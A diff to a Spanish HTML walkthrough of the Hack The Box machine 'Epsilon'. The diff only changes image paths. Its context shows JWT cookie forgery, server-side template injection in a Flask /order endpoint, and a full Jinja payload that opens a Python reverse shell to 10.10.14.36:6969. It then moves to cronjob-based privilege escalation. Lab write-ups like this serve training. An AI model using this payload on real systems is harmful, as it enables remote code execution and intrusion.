@@ -95,8 +95,8 @@ print(token)</code></pre>
 <pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.10.134/home</code></pre>
 
 <p>También podemos usar la misma cookie para acceder a <code>http://epsilon.htb:5000/home</code>:</p>
-<img src="img/epsilon/img3.png" alt="Home dentro de la plataforma">
-<img src="img/epsilon/img4.png" alt="Vista del home autenticado">
+<img src="./img/epsilon/img3.png" alt="Home dentro de la plataforma">
+<img src="./img/epsilon/img4.png" alt="Vista del home autenticado">
 
 <h4>Explotación SSTI</h4>
 <p>En <code>/order</code>, los campos son evaluados con <code>render_template_string</code>, permitiendo <strong>SSTI</strong>. Para reconocimiento probamos:</p>
@@ -104,14 +104,14 @@ print(token)</code></pre>
 <pre><code>{{ 3*3 }}</code></pre>
 
 <p>Obtenemos <strong>9</strong> en la respuesta (Burp), confirmando vulnerabilidad:</p>
-<img src="img/epsilon/img5.png" alt="Prueba SSTI">
+<img src="./img/epsilon/img5.png" alt="Prueba SSTI">
 
 <p>Para ejecutar reverse shell usamos:</p>
 
 <pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.14.36\',6969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'/bin/bash\')"').read() }}</code></pre>
 
 <p>Obtuvimos reverse shell y la primera flag (<code>user.txt</code>):</p>
-<img src="img/epsilon/img6.png" alt="Primera flag obtenida">
+<img src="./img/epsilon/img6.png" alt="Primera flag obtenida">
 
 <h3>5. Escalada de privilegios</h3>
 <p>Usamos <code>pspy</code> y encontramos un cronjob de backup que ejecuta <code>tar -h</code> cada 5 segundos:</p>
